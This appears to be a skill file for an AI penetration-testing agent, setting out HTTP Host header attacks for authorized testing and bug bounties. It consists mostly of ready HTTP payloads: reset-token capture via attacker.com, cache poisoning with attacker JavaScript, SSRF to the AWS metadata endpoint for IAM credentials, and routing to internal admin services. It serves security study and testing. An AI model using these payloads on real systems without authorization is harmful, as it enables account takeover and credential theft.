---
name: host-header-attacks
description: "HTTP Host header attack methodology for authorized security testing. Covers: password reset poisoning (Host header manipulation), web cache poisoning via unkeyed Host header, SSRF via Host to internal services, routing-based SSRF in microservices, connection-state attacks. High-tier bounty ceiling. 7 PortSwigger labs."
trigger_keywords: "host header, host header attack, password reset poison, x-forwarded-host, virtual host, routing ssrf, host injection, cache host, forwarded host, host override, internal routing"
version: 1.0
created: 2026-02-25
owner: cyber-operator
---

# HTTP Host Header Attacks

## Purpose

Exploit applications that trust the Host header value for generating URLs, routing requests, or cache keying — without validating the header. High bounty ceiling. 7 PortSwigger labs.

---

## Password Reset Poisoning — Full Test Sequence

```http
# Test 1: Direct Host replacement
POST /forgot-password HTTP/1.1
Host: attacker.com
email=victim@example.com

# Test 2: X-Forwarded-Host override
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
email=victim@example.com

# Test 3: Dual Host headers
POST /forgot-password HTTP/1.1
Host: target.com
Host: attacker.com
email=victim@example.com

# Test 4: X-Forwarded-Server
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Server: attacker.com
email=victim@example.com

# Test 5: Host port injection
POST /forgot-password HTTP/1.1
Host: target.com:@attacker.com
email=victim@example.com

# Test 6: Subdomain append
POST /forgot-password HTTP/1.1
Host: target.com.attacker.com
email=victim@example.com

# Test 7: Absolute URL in request line
POST https://target.com/forgot-password HTTP/1.1
Host: attacker.com
email=victim@example.com
```

**Evidence:** Burp Collaborator interaction showing token received from victim's email click.

---

## Web Cache Poisoning via Host Header

```http
# If cache key = URL path only (not Host header):
GET /static/main.js HTTP/1.1
Host: attacker.com
# Backend generates: <script src="//attacker.com/static/main.js"></script>
# Cache stores this response for /static/main.js
# All subsequent visitors served attacker's JS
```

Use Param Miner (Burp extension) to discover unkeyed inputs automatically.

---

## SSRF via Host Header

```http
# App makes internal request using Host header value:
# fetch("http://" + request.host + "/api/health")

GET /healthcheck HTTP/1.1
Host: 169.254.169.254
# Server requests AWS metadata endpoint → returns IAM credentials

# Other internal targets:
Host: 10.0.0.1         # Internal service
Host: 127.0.0.1        # Localhost
Host: [::1]            # IPv6 localhost
Host: internal-admin.target.local
```

---

## Routing-Based SSRF (Microservices)

```http
# Reverse proxy routes to backend based on Host header:
# Normal: Host: api.target.com → api-service
# Attack: Host: internal-admin.target.local → admin backend

GET /admin HTTP/1.1
Host: internal-admin.target.local
```

---

## Connection-State Attack

```http
# First request — establishes routing context
GET / HTTP/1.1
Host: target.com
Connection: keep-alive

# Second request on same keep-alive connection
GET /admin HTTP/1.1
Host: internal.target.local
Connection: close
# Server may use first request's Host for routing context
```

---

## Param Miner Setup

1. Install Burp BApp Store → Param Miner
2. Right-click request → Extensions → Param Miner → Guess headers
3. Look for `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server` triggering different responses

---

## Evidence Standards

- Reset poisoning: Collaborator interaction showing token. Describe impact: "attacker receives victim's reset token and can set a new password."
- Cache poisoning via Host: Show the poisoned response in cache (check with cache-buster removal). Show impact: "all visitors receive malicious JavaScript."
- SSRF via Host: Show the internal response or Collaborator DNS interaction.

*host-header-attacks.md v1.0 | owner: cyber-operator | 2026-02-25*
